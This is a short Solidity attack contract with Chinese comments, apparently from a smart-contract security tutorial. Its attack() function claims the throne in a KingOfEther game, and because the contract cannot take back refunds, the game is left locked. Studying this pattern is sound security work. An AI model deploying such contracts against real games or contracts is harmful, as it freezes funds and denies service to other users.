// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./KingOfEther.sol";

/**
 * 此攻击方法只是其中一种
 * 另一种攻击方法稍后调试成功后再补充
 */

contract Attack {
    KingOfEther kingOfEther;

    /* 初始化。注意此处传入的不是address */
    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    /* 攻击方法，传入比前一个king更多的ether */
    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}